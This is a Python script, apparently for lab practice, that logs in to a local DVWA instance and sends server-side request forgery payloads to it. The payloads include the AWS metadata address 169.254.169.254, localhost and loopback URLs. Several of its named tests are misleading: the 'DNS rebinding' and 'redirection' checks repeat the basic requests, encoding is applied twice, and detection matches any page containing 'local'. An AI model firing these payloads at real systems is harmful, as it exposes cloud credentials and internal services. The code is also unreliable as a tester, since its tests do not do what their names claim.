import requests
import logging
from bs4 import BeautifulSoup

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# DVWA credentials
dvwa_username = 'admin'
dvwa_password = 'password'

# Define SSRF payloads
ssrf_payloads = [
    'http://169.254.169.254/latest/meta-data/',  # AWS Metadata URL
    'http://169.254.169.254/',                   # AWS Metadata URL root
    'http://localhost/',                         # Localhost
    'http://127.0.0.1/',                         # Loopback
    'http://[::1]/',                             # IPv6 Loopback
    'http://example.com/',                       # External URL
]

# Function to log in to DVWA
def dvwa_login(session, login_url):
    # Get the login page to retrieve CSRF token
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'})['value']

    # Prepare login payload
    login_payload = {
        'username': dvwa_username,
        'password': dvwa_password,
        'Login': 'Login',
        'user_token': user_token
    }

    # Post the login data
    session.post(login_url, data=login_payload)
    logging.info("Logged in to DVWA.")

# Function to test Basic SSRF
def test_basic_ssrf(session, url, payloads):
    for payload in payloads:
        logging.info(f"Testing Basic SSRF with payload: {payload}")
        response = session.get(url, params={'url': payload})
        
        # Check if the response indicates successful SSRF
        if "latest/meta-data" in response.text or "EC2" in response.text or "local" in response.text:
            logging.info(f"[SSRF] Vulnerability found with payload: {payload}")
        else:
            logging.info(f"[No Vulnerability] Tested payload: {payload}")

# Function to test SSRF with HTTP redirection
def test_ssrf_with_redirect(session, url, payloads):
    for payload in payloads:
        logging.info(f"Testing SSRF with Redirection using payload: {payload}")
        response = session.get(url, params={'url': payload}, allow_redirects=True)
        
        # Check if the response indicates successful SSRF through redirection
        if "latest/meta-data" in response.text or "EC2" in response.text or "local" in response.text:
            logging.info(f"[SSRF] Vulnerability found with payload: {payload}")
        else:
            logging.info(f"[No Vulnerability] Tested payload: {payload}")

# Function to test SSRF with DNS rebinding
def test_ssrf_dns_rebinding(session, url, payloads):
    for payload in payloads:
        logging.info(f"Testing SSRF with DNS Rebinding using payload: {payload}")
        response = session.get(url, params={'url': payload})
        
        # Check if the response indicates successful SSRF
        if "latest/meta-data" in response.text or "EC2" in response.text or "local" in response.text:
            logging.info(f"[SSRF] Vulnerability found with payload: {payload}")
        else:
            logging.info(f"[No Vulnerability] Tested payload: {payload}")

# Function to test SSRF with URL encoding
def test_ssrf_url_encoding(session, url, payloads):
    for payload in payloads:
        encoded_payload = requests.utils.quote(payload)
        logging.info(f"Testing SSRF with URL Encoding using payload: {encoded_payload}")
        response = session.get(url, params={'url': encoded_payload})
        
        # Check if the response indicates successful SSRF
        if "latest/meta-data" in response.text or "EC2" in response.text or "local" in response.text:
            logging.info(f"[SSRF] Vulnerability found with payload: {encoded_payload}")
        else:
            logging.info(f"[No Vulnerability] Tested payload: {encoded_payload}")

# Function to test SSRF with varying HTTP methods (GET, POST)
def test_ssrf_http_methods(session, url, payloads):
    for payload in payloads:
        logging.info(f"Testing SSRF with HTTP GET Method using payload: {payload}")
        response_get = session.get(url, params={'url': payload})
        logging.info(f"Testing SSRF with HTTP POST Method using payload: {payload}")
        response_post = session.post(url, data={'url': payload})
        
        # Check if the response indicates successful SSRF
        if ("latest/meta-data" in response_get.text or "EC2" in response_get.text or "local" in response_get.text) or \
           ("latest/meta-data" in response_post.text or "EC2" in response_post.text or "local" in response_post.text):
            logging.info(f"[SSRF] Vulnerability found with payload: {payload}")
        else:
            logging.info(f"[No Vulnerability] Tested payload: {payload}")

# Main function to run all SSRF tests
def main():
    # Target URL (Update this with your vulnerable application URL)
    target_url = 'http://localhost/DVWA/vulnerabilities/ssrf/'  # Example path for SSRF in DVWA

    with requests.Session() as session:
        # Log in to DVWA
        dvwa_login(session, target_url.replace('vulnerabilities/ssrf/', 'login.php'))

        logging.info(f"Starting SSRF vulnerability scans on {target_url}...")

        # Scenario 1: Basic SSRF
        logging.info("Testing Basic SSRF...")
        test_basic_ssrf(session, target_url, ssrf_payloads)

        # Scenario 2: SSRF with HTTP Redirection
        logging.info("Testing SSRF with HTTP Redirection...")
        test_ssrf_with_redirect(session, target_url, ssrf_payloads)

        # Scenario 3: SSRF with DNS Rebinding
        logging.info("Testing SSRF with DNS Rebinding...")
        test_ssrf_dns_rebinding(session, target_url, ssrf_payloads)

        # Scenario 4: SSRF with URL Encoding
        logging.info("Testing SSRF with URL Encoding...")
        test_ssrf_url_encoding(session, target_url, ssrf_payloads)

        # Scenario 5: SSRF with Varying HTTP Methods
        logging.info("Testing SSRF with Varying HTTP Methods...")
        test_ssrf_http_methods(session, target_url, ssrf_payloads)

        logging.info("SSRF vulnerability scans completed.")

if __name__ == "__main__":
    main()
